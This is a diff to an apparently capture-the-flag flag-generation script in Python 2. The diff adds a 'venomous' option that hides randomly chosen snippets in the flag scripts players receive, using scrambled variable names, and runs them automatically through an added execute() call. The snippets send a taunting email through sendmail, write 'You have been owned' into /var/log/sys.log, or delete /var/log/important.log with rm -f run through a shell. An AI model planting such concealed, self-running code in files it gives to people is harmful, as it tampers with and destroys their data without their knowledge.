@@ -11,6 +11,129 @@ hdlr.setFormatter(formatter)
 logger.addHandler(hdlr)
 logger.setLevel(logging.INFO)
 
+def unique_obfuscate_function(venomous):
+    from random import randint
+
+    bad_1 = '''def execute():
+    from email.mime.text import MIMEText
+    from subprocess import Popen, PIPE
+    weird = "your"
+    here = "admin"
+    b311 = "Call"
+    msg["To"] = here + "@yourdomain.com"
+    yank = "owned"
+    slip = "security"
+    al = "server"
+    msg["From"] = "root@" + yank +".com"
+    p = Popen(["/usr/sbin/sendmail", "-t"], stdin=PIPE)
+    done = weird + yank + slip
+    msg = MIMEText(done)
+    msg["Subject"] = done
+    p.communicate(msg.as_string())'''
+
+    bad_2 = '''def execute():
+    import subprocess
+    where = "rm"
+    who = "-f"
+    this = "owned"
+    why = "curl"
+    zip = "You"
+    options = "echo"
+    lost = "been"
+    here = "world"
+    keep = "sys.log"
+    what = "important"
+    cool = "have"
+    when = ".log"
+    zoom = "ifconfig.me"
+    places = "None"
+    yup = "Hello"
+    there = options + " " + zip + " " + cool + lost + this + " >> " + "/var/log/" + keep
+    print there
+    bring = subprocess.call("{0}".format(there), shell=True)
+    '''
+
+    bad_3 = '''def execute():
+    import subprocess
+    where = "rm"
+    who = "-f"
+    this = "owned"
+    why = "curl"
+    zip = "You"
+    options = "echo"
+    lost = "been"
+    here = "world"
+    keep = "sys.log"
+    what = "important"
+    cool = "have"
+    when = ".log"
+    zoom = "ifconfig.me"
+    places = "None"
+    yup = "Hello"
+    there = where + " " + who + " " + "/var/log/" + what + when
+    print there
+    bring = subprocess.call("{0}".format(there), shell=True)
+    '''
+
+    good_1 = '''def execute():
+    import subprocess
+    where = "rm"
+    who = "-f"
+    this = "owned"
+    why = "curl"
+    zip = "You"
+    options = "echo"
+    lost = "been"
+    here = "world"
+    keep = "sys.log"
+    what = "important"
+    cool = "have"
+    when = ".log"
+    zoom = "ifconfig.me"
+    places = "None"
+    yup = "Hello"
+    there = options + " " + yup + " " + here
+    print there
+    bring = subprocess.call("{0}".format(there), shell=True)
+    '''
+
+    good_2 = '''def execute():
+    import subprocess
+    where = "rm"
+    who = "-f"
+    this = "owned"
+    why = "curl"
+    zip = "You"
+    options = "echo"
+    lost = "been"
+    here = "world"
+    keep = "sys.log"
+    what = "important"
+    cool = "have"
+    when = ".log"
+    zoom = "ifconfig.me"
+    places = "None"
+    yup = "Hello"
+    there = why + " " + zoom
+    print there
+    bring = subprocess.call("{0}".format(there), shell=True)
+    '''
+
+    if venomous != 0:
+        pick_function = randint(1,3)
+        if pick_function == 1:
+            return bad_1
+        elif pick_function == 2:
+            return bad_2
+        else:
+            return bad_3
+    else:
+        pick_function = randint(4,5)
+        if pick_function == 4:
+            return good_1
+        else:
+            return good_2
+
 def check_if_flagname_exists(flagname):    # Check if user has already submitted
 
     import sqlite3
@@ -89,7 +212,7 @@ def obfuscate_script(flag_name):
     except Exception, e:
         logger.info("Close the obfuscated version of file: {0}".format(e))
 
-def createFlag(flag_name, pub_key, flag_uuid, ipaddress):    # Used to create the flag, requires flag name, public key, and uuid
+def createFlag(flag_name, pub_key, flag_uuid, ipaddress, venomous):    # Used to create the flag, requires flag name, public key, and uuid
 
     # Had to split script into 2 sections due to using similar quotes
     script_argparse = """#!/usr/bin/python
@@ -130,6 +253,7 @@ if __name__ == "__main__":
     PORT = 65535    # Arbitrary non-privileged port
     username = args['username']
 
+    execute()
     if not args['message']:
         message = '%s has modestly pwned a box.' % username
     else:
@@ -160,7 +284,12 @@ if __name__ == "__main__":
         logger.info("Insert flag_uuid and ipaddress into string: {0}".format(e))
 
     try:
-        full_script = script_argparse + script_encryption + script_part    # Tie string (script) together
+        unique = unique_obfuscate_function(venomous)
+    except Exception, e:
+        logger.info("Call to unique_obfuscate_function: {0}".format(e))
+
+    try:
+        full_script = script_argparse + script_encryption + unique + script_part    # Tie string (script) together
     except Exception, e:
         logger.info("Combine variables to create script: {0}".format(e))
 
@@ -222,3 +351,4 @@ def update_uuid_db(flagname, newuuid, numpoints, venomous):     # Insert flag in
             print('There is a problem with the database. Delete and restart')    # Make some recommendations, this shouldn't happen
     except Exception, e:
         logger.info("Check if database exists: {0}".format(e))
+
